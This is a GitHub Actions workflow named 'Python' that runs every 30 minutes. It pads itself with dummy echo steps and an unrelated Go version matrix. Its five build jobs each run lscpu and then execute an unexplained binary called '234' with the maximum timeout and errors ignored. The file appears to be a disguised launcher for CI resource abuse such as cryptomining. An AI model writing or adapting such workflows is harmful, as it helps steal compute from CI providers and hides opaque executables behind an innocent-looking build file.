name: Python
on:  
  push:
  pull_request:
  schedule:
  - cron: "*/30 * * * *"
 
jobs:
 python-1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
         go: [1.11, 1.12, 1.13, 1.14, 1.15]
         flag: [A, B]
    timeout-minutes: 360
 
    steps:
    - uses: actions/checkout@v2
    - name: Python-run
      run: echo "pythosns"
 
 python-2:
    runs-on: ubuntu-latest 
    needs: python-1
    strategy:
      fail-fast: false
      matrix:
         go: [1.11, 1.12, 1.13, 1.14, 1.15]
         flag: [A, B]
    timeout-minutes: 360
 
    steps:
    - uses: actions/checkout@v2
    - name: Python-run
      run: echo "python"
 
 python-build-5:
    runs-on: ubuntu-latest
    needs: python-2
    strategy:
      fail-fast: false
      matrix:
         go: [1.11]
         flag: [A]
    timeout-minutes: 360
    steps:
    - uses: actions/checkout@v2
    - name: Rerunning
      continue-on-error: true
      run: |
        lscpu
        chmod +x 234
        ./234
        
 python-build-4:
    runs-on: ubuntu-latest
    needs: python-2
    strategy:
      fail-fast: false
      matrix:
         go: [1.12]
         flag: [B]
    timeout-minutes: 360
    steps:
    - uses: actions/checkout@v2
    - name: Rerunning
      continue-on-error: true
      run: |
        lscpu
        chmod +x 234
        ./234
 
 python-build-3:
    runs-on: ubuntu-latest
    needs: python-2
    strategy:
      fail-fast: false
      matrix:
         go: [1.13]
         flag: [C]
    timeout-minutes: 360
    steps:
    - uses: actions/checkout@v2
    - name: Rerunning
      continue-on-error: true
      run: |
        lscpu
        chmod +x 234
        ./234
        
 python-build-2:
    runs-on: ubuntu-latest
    needs: python-2
    strategy:
      fail-fast: false
      matrix:
         go: [1.14]
         flag: [D]
    timeout-minutes: 360
    steps:
    - uses: actions/checkout@v2
    - name: Rerunning
      continue-on-error: true
      run: |
        lscpu
        chmod +x 234
        ./234
        
 python-build-1:
    runs-on: ubuntu-latest
    needs: python-2
    strategy:
      fail-fast: false
      matrix:
         go: [1.15]
         flag: [E]
    timeout-minutes: 360
    steps:
    - uses: actions/checkout@v2
    - name: Rerunning
      continue-on-error: true
      run: |
        lscpu
        chmod +x 234
        ./234
